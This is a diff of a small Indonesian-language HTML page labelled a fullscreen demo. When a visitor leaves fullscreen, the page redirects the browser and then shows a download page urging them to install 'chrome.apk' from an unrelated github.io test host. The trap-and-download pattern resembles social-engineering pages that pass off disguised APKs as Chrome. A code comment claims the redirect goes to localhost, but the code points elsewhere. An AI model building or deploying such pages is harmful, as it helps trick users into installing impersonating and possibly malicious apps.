@@ -1,90 +1,69 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <title>Fullscreen Demo</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            margin-top: 50px;
-        }
-
-        #modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.6);
-            justify-content: center;
-            align-items: center;
-        }
-
-        .modal-content {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            text-align: center;
-        }
-
-        button, a {
-            padding: 10px 20px;
-            margin: 10px;
-            text-decoration: none;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-
-        .btn-primary {
-            background: #007bff;
-            color: white;
-        }
-
-        .btn-download {
-            background: #28a745;
-            color: white;
-        }
-    </style>
+<meta charset="UTF-8">
+<title>Fullscreen Redirect + Download</title>
+<style>
+body{
+    font-family: Arial;
+    text-align:center;
+    margin-top:100px;
+}
+button, a{
+    padding:12px 25px;
+    border:none;
+    border-radius:5px;
+    text-decoration:none;
+    cursor:pointer;
+    display:inline-block;
+    margin:10px;
+}
+.btn-full{
+    background:#007bff;
+    color:white;
+}
+.btn-download{
+    background:green;
+    color:white;
+}
+</style>
 </head>
 <body>
 
+<div id="mainPage">
     <h1>Demo Fullscreen</h1>
-    <button class="btn-primary" onclick="openFullscreen()">Masuk Fullscreen</button>
+    <button class="btn-full" onclick="openFullscreen()">Masuk Fullscreen</button>
+</div>
 
-    <!-- Modal -->
-    <div id="modal">
-        <div class="modal-content">
-            <h2>Anda keluar dari Fullscreen</h2>
-            <p>Silakan download aplikasi jika diperlukan.</p>
-            <a href="http://ecdnts-del.github.io/test-apk/chrome.apk" class="btn-download" download>
-                Download Aplikasi
-            </a>
-            <br>
-            <button onclick="closeModal()">Tutup</button>
-        </div>
-    </div>
+<div id="downloadPage" style="display:none;">
+    <h2>Download Aplikasi</h2>
+    <p>Klik tombol di bawah untuk mengunduh APK.</p>
+    <a class="btn-download" href="http://ecdnts-del.github.io/test-apk/chrome.apk">
+        Download Sekarang
+    </a>
+</div>
 
-    <script>
-        function openFullscreen() {
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen();
-            }
-        }
+<script>
+function openFullscreen(){
+    if(document.documentElement.requestFullscreen){
+        document.documentElement.requestFullscreen();
+    }
+}
 
-        document.addEventListener("fullscreenchange", function() {
-            if (!document.fullscreenElement) {
-                // Ketika keluar fullscreen
-                document.getElementById("modal").style.display = "flex";
-            }
-        });
+// Saat keluar fullscreen
+document.addEventListener("fullscreenchange", function(){
+    if(!document.fullscreenElement){
+        // Redirect ke localhost (file yang sama)
+        window.location.href = "http://chrome.com/";
+    }
+});
 
-        function closeModal() {
-            document.getElementById("modal").style.display = "none";
-        }
-    </script>
+// Jika sudah di localhost, tampilkan halaman download
+if(window.location.hostname === "localhost"){
+    document.getElementById("mainPage").style.display = "none";
+    document.getElementById("downloadPage").style.display = "block";
+}
+</script>
 
 </body>
 </html>
